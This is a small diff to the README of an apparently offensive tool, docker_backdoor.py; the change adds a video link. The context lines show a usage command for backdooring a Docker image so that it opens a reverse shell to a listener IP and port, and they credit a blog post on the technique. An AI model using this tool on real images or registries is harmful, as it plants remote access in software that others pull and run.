@@ -54,6 +54,8 @@ pip install -r requirements.txt
 python docker_backdoor.py -i <base-image> -o <output-image> -l <listener-ip> -p <listener-port> --shell-url <url-to-reverse-shell>
 ```
 
+[![Watch the video](https://i9.ytimg.com/vi_webp/YIwkOf3P2ws/mqdefault.webp?v=662d6aaf&sqp=CKjTtbEG&rs=AOn4CLDNoW7ZHFtktp9-dI3EaiUb4swHMg)](https://youtu.be/YIwkOf3P2ws)
+
 ## Credits [Based On]
 
 - **Backdooring Docker images - Reverse shell**: [Backdooring Docker images - Reverse shell](https://greencashew.dev/posts/backdooring-docker-images-reverse-shell/)
